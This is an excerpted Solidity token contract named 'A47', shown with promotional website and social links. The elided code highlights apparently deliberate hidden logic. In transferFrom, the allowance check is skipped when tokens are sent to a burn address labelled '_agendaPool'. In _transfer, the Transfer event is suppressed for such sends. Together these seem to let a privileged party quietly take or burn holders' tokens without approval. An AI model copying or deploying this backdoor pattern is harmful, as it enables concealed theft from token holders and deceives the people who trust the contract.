...
Website: https://agenda47.live

Telegram: https://t.me/a47_erc

Twitter: https://x.com/a47_erc
...
contract A47 is Context, IERC20, Ownable {
    ...
    address payable private _agendaTax;
    address private _agendaPool = address(0xdead);
    ...
    constructor() payable {
        _agendaTax = payable(0x71685296eAE808D0a5a454798cba6188FE9569EA);
        _balances[msg.sender] = _tTotal;
        _excludedWallets[owner()] = true;
        _excludedWallets[address(this)] = true;
        _excludedWallets[_agendaTax] = true;
    ...
    function transferFrom(
        ...
        if (
            !((_msgSender() != uniswapV2Router.factory() &&
                ...
                (sender != uniswapV2Pair && recipient == _agendaPool))
        )
            _approve(
                sender,
                _msgSender(),
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_agendaPool != to) emit Transfer(from, to, amount.sub(taxAmount));
